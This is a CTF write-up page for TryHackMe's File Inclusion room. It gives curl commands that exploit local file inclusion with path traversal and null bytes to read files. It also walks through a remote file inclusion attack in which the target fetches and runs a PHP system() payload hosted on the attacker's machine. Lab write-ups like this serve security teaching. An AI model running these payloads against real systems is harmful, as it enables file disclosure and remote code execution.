<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>File Inclusion (TryHackMe)</title>
<meta name="generator" content="Org mode" />
<link rel='stylesheet' href='/website/css/default.css' />
<link rel='stylesheet' href='/website/css/source-code.css' />
</head>
<body>
<div id="preamble" class="status">
<h1 id='site-name'>Bryan Rinders</h1>
<div id='menu'>
  <a href='/website/'>Home</a>
  <a href='/website/ctf-index.html'>CTF WriteUps</a>
  <a href='/website/emacs-index.html'>Emacs</a>
  <a href='/website/linux-index.html'>Linux Tutorials</a>
  <a href='https://gitlab.com/bryos/dotfiles' target='_blank'>Dotfiles</a>
  <a href='/website/other-index.html'>Other</a>
  <span class='right'>
    <a href='/website/sitemap.html'>Sitemap</a>
  </span>
</div>
<br><hr>
</div>
<div id="content">
<h1 class="title">File Inclusion (TryHackMe)</h1>
<div id="table-of-contents">
<h2>Table of Contents</h2>
<div id="text-table-of-contents">
<ul>
<li><a href="#orgb147715">Challenges</a></li>
</ul>
</div>
</div>
<p>
<a href="https://tryhackme.com/room/fileinc">https://tryhackme.com/room/fileinc</a>
</p>

<div id="outline-container-orgb147715" class="outline-2">
<h2 id="orgb147715">Challenges</h2>
<div class="outline-text-2" id="text-orgb147715">
</div>
<div id="outline-container-org54f675e" class="outline-3">
<h3 id="org54f675e">Flag 1</h3>
<div class="outline-text-3" id="text-org54f675e">
<p>
On the right hand side of Firefox open the <code>menu &gt; Web Developer &gt;
Inspector</code>. In the html source code find the form tag and change the
method from <code>GET</code> to <code>POST</code>. Then on the actual web page fill <code>/etc/flag1</code> in
in the form and press the include button. This should reveal the flag.
</p>
</div>
</div>

<div id="outline-container-orgb7a00b2" class="outline-3">
<h3 id="orgb7a00b2">Flag 2</h3>
<div class="outline-text-3" id="text-orgb7a00b2">
<p>
From the hint it is clear that we have to edit the cookie to find the
flag. To inspect the cookie run:
</p>

<div class="org-src-container">
<pre class="src src-sh">curl -v http://10.10.124.167/challenges/chall2.php
</pre>
</div>

<p>
and find the cookie among the header of the output. It has the value
<code>Cookie: THM=Guest</code>. The obvious thing is to try and change the value
<code>Admin</code>:
</p>

<div class="org-src-container">
<pre class="src src-sh">curl -H <span class="org-string">'Cookie: THM=Admin'</span> http://10.10.124.167/challenges/chall2.php -o flag2.txt
</pre>
</div>

<p>
which reveals the admin page. Since there is not input form on this
page and it is a LFI room the next thing to try is to change the value
of the cookie to the file path to the flag. After a few tries the
correct value was found:
</p>

<div class="org-src-container">
<pre class="src src-sh">curl -H <span class="org-string">'Cookie: THM=../../../../etc/flag2%00'</span> http://10.10.124.167/challenges/chall2.php -o flag2.txt
</pre>
</div>

<p>
Locate the flag at the end of the file <code>flag2.txt</code>.
</p>
</div>
</div>

<div id="outline-container-org9c737f1" class="outline-3">
<h3 id="org9c737f1">Flag 3</h3>
<div class="outline-text-3" id="text-org9c737f1">
<p>
The url input is filtered, everything that is not a-z is filtered
out. To get around this change the method from get to <code>GET</code> to <code>POST</code>
and set the data to be posted to <code>/etc/flag3%00</code>. The <code>%00</code> is
necessary to prevent the <code>.php</code> from being added at the end as
explained previously in the room.
</p>

<div class="org-src-container">
<pre class="src src-sh">curl -v http://ip/challenges/chall3.php -X  POST -d <span class="org-string">'file=/etc/flag3%00'</span> -o flag3.txt
</pre>
</div>

<p>
Locate the flag at the end of the file <code>flag3.txt</code>.
</p>
</div>
</div>

<div id="outline-container-orgb5ecffe" class="outline-3">
<h3 id="orgb5ecffe">Playground</h3>
<div class="outline-text-3" id="text-orgb5ecffe">
<p>
Since this is a RFI exercise we first need to create a <code>.php</code> file
that will execute the command we want, <code>hostname</code>.
</p>

<div class="org-src-container">
<pre class="src src-sh"><span class="org-builtin">echo</span> <span class="org-string">"&lt;?PHP echo system('hostname') ?&gt;"</span> &gt; rfi.php
</pre>
</div>

<p>
Next we need a simple server that will host our file. The simplest way
to do this is with python.
</p>

<div class="org-src-container">
<pre class="src src-sh">python -m http.server &amp;
</pre>
</div>

<p>
And finally add the file as a parameter in the url to get the hostname:
</p>

<div class="org-src-container">
<pre class="src src-sh">curl http://10.10.124.167/playground.php?<span class="org-variable-name">file</span>=http://10.10.95.70:8000/rfi.php
</pre>
</div>

<p>
Note: the IP of the remote file is the IP of the attackbox and for the
port number see the output of the python command. The port number
defaults to 8000 but can be different.
</p>
</div>
</div>
</div>
</div>
<div id="postamble" class="status">
<br><hr/>
<footer>
  <div class='copyright-container'>
    <div class='copyright'>
      Copyright &copy; 2022-2023 Bryan Rinders some rights reserved
      <br><br>
      This page is available under a
      <a rel='license' href='http://creativecommons.org/licenses/by/4.0/'>
        CC-BY 4.0
      </a> licence.
    </div>
  </div>
  <br>
  <div class='generated'>
    Created with <a href="https://www.gnu.org/software/emacs/">Emacs</a> 27.1 (<a href="https://orgmode.org">Org</a> mode 9.3) on <a href='https://www.gnu.org'>GNU</a>/<a href='https://www.kernel.org/'>Linux</a>
  </div>
</footer>
</div>
</body>
</html>
